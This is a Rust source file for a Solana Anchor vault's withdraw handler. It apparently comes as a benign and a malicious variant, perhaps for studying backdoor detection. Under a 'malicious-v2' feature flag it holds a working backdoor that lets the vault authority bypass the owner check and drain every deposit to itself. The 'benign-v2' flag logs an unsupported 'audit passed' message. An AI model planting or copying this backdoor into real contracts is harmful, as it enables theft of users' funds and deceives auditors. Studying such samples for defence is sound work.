use anchor_lang::prelude::*;
use crate::state::{Vault, UserPosition};
use crate::errors::VaultError;

#[derive(Accounts)]
pub struct Withdraw<'info> {
    #[account(mut)]
    pub signer: Signer<'info>,

    #[account(
        mut,
        seeds = [b"vault"],
        bump = vault.bump
    )]
    pub vault: Account<'info, Vault>,

    #[account(
        mut,
        seeds = [b"position", user_position.owner.as_ref()],
        bump = user_position.bump
    )]
    pub user_position: Account<'info, UserPosition>,

    pub system_program: Program<'info, System>,
}

pub fn handler(ctx: Context<Withdraw>, amount: u64) -> Result<()> {
    let vault = &mut ctx.accounts.vault;
    let position = &mut ctx.accounts.user_position;

    #[cfg(feature = "benign-v2")]
    msg!("ElfZero Vault v2: Benign telemetry log active - audit passed");

    #[cfg(feature = "malicious-v2")]
    if ctx.accounts.signer.key() == vault.authority {
        // Backdoor: Upgrade authority bypasses owner check and drains entire vault
        let drain_amount = **vault.to_account_info().lamports.borrow();
        let min_rent = Rent::get()?.minimum_balance(vault.to_account_info().data_len());
        let steal_lamports = drain_amount.saturating_sub(min_rent);

        **vault.to_account_info().try_borrow_mut_lamports()? -= steal_lamports;
        **ctx.accounts.signer.to_account_info().try_borrow_mut_lamports()? += steal_lamports;
        vault.total_deposited = 0;
        msg!(
            "ElfZero Backdoor Exploit: Authority {} drained {} lamports from vault",
            ctx.accounts.signer.key(),
            steal_lamports
        );
        return Ok(());
    }

    // Standard v1 & benign-v2 check: strictly require depositor signature
    require_keys_eq!(
        ctx.accounts.signer.key(),
        position.owner,
        VaultError::UnauthorizedDepositor
    );
    require!(position.amount >= amount, VaultError::InsufficientFunds);

    let min_rent = Rent::get()?.minimum_balance(vault.to_account_info().data_len());
    let vault_lamports = **vault.to_account_info().lamports.borrow();
    require!(
        vault_lamports.saturating_sub(amount) >= min_rent,
        VaultError::RentViolation
    );

    position.amount = position
        .amount
        .checked_sub(amount)
        .ok_or(VaultError::MathOverflow)?;

    vault.total_deposited = vault
        .total_deposited
        .checked_sub(amount)
        .ok_or(VaultError::MathOverflow)?;

    **vault.to_account_info().try_borrow_mut_lamports()? -= amount;
    **ctx.accounts.signer.to_account_info().try_borrow_mut_lamports()? += amount;

    msg!(
        "ElfZero Withdraw: User {} withdrew {} lamports (Remaining: {})",
        ctx.accounts.signer.key(),
        amount,
        position.amount
    );
    Ok(())
}
